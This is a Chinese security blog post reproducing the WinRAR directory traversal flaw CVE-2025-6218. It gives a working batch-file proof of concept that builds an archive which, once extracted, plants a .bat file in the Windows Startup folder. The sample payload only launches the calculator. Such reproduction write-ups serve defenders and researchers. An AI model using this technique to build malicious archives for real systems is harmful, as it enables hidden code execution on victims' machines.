#  【漏洞复现】CVE-2025-6218｜WinRAR目录遍历远程代码执行漏洞  
原创 alicy  信安百科   2025-07-13 12:02  
  
**0x00 前言**  
  
  
WinRAR 是一款功能强大的压缩包管理器，它是档案工具RAR在 Windows环境下的图形界面。  
  
该软件可用于备份数据，缩减电子邮件附件的大小，解压缩从 Internet 上下载的RAR、ZIP及其它类型文件，并且可以新建 RAR 及 ZIP 格式等的压缩类文件。  
  
从5.60版开始，WinRAR启用了新的图标，但用户仍可以通过官网提供的主题包换回原版风格的图标。  
  
  
  
**0x01 漏洞描述**  
  
  
漏洞的根本原因在于WinRAR对文件路径的处理不当，恶意构造的文件路径可能导致进程访问不该访问的目录，从而在当前用户上下文中执行恶意代码。  
  
  
  
**0x02 CVE编号**  
  
  
CVE-2025-6218  
  
  
  
**0x03 影响版本**  
  
  
WinRAR ≤ 7.11  
  
  
  
**0x04 漏洞复现**  
  
  
1、下载安装winrar（版本  
≤ 7.11  
）  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6urBcuan8AGZnEouauEBWhtoTvS4gsrgJgPibpszy6fmfT1f4V4syDiabzZR2UKfJl2w5hpU6yRLI30w/640?wx_fmt=png&from=appmsg "")  
  
  
2、使用  
CVE-2025-6218的  
POC生成恶意压缩包文件  
  
  
POC：  
  
https://github.com/skimask1690/CVE-2025-6218-POC  
  
  
批处理文件内容如下：  
```
@echo off
title CVE-2025-6218 POC

echo calc.exe > POC.bat

"C:\Program Files\WinRAR\WinRAR.exe" a -ap" \.. \.. \AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"  CVE-2025-6218.zip POC.bat

echo.
if errorlevel 1 (
    echo [!] Failed to create POC.
) else (
    echo [+] CVE-2025-6218.zip created successfully!
)
echo.

del POC.bat

pause
```  
  
  
注意：  
```
" \.. \.. \AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
中的\.. \.. \根据当前bat的目录位置决定增加还是减少
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6urBcuan8AGZnEouauEBWhto9yplgfq9dvlUozBvE4PBkvb2gPd6ic3uC9uLCiaHpzHGn5fpO8OfYaYA/640?wx_fmt=png&from=appmsg "")  
  
  
3、右键解压缩恶意文件到目录时，触发目录跳转。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6urBcuan8AGZnEouauEBWhtokBe8VXw88ic9iarmhZrsgLr2jDHLUc03XntllbMR5A0VaSXjokgFH17g/640?wx_fmt=png&from=appmsg "")  
  
  
4、启动目录成功看到恶意的bat文件  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6urBcuan8AGZnEouauEBWhtoiaNwbibCsgKySibCCUZqc4azZgrBpibY31J0QaQKKy11t3CVLqn6myK7wg/640?wx_fmt=png&from=appmsg "")  
  
  
5、重启系统之后可以看到恶意bat文件成功执行。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6urBcuan8AGZnEouauEBWhtobNjwxDePD3jibp64hhtcn0DQRvGfmFZAAMX7hDw3vthk0ib7Zgx4h9yw/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x05 参考链接**  
  
  
https://www.zerodayinitiative.com/advisories/ZDI-25-409/  
  
  
  
  
推荐阅读：  
  
  
[CVE-2025-6218｜WinRAR目录遍历远程代码执行漏洞](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247486063&idx=2&sn=a3d57d6619d987a8d64a725f1bc82373&scene=21#wechat_redirect)  
  
  
  
[【漏洞复现】CVE-2023-38831 WinRAR代码执行漏洞](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247484513&idx=1&sn=0fc004e592088c252a8a6ebfc33c3ea0&scene=21#wechat_redirect)  
  
  
  
[CVE-2025-49113｜Roundcube Webmail反序列化漏洞（POC）](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485975&idx=1&sn=a3a96fcfeca034089636e9a89ae83d48&scene=21#wechat_redirect)  
  
  
  
  
  
Ps：国内外安全热点分享，欢迎大家分享、转载，请保证文章的完整性。文章中出现敏感信息和侵权内容，请联系作者删除信息。信息安全任重道远，感谢您的支持  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6urTIficI8UhQibwpYWx4ic7Bk40AJlXrgx3icofWCbd5cbJFheld132R8exvlHnicn0AUjHLmVok4wV9qA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
！！！  
  
  
**本公众号的文章及工具仅提供学习参考，由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用者本人负责,本公众号及文章作者不为此承担任何责任。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6uqQ24S6worK6npevNP8p1uPc9jQeMAib2iaibBnibOzFaIbD0KlvsEtUAmL3xdbJJnWk74Y1KfBcIazzw/640?wx_fmt=png "")  
  
  
  
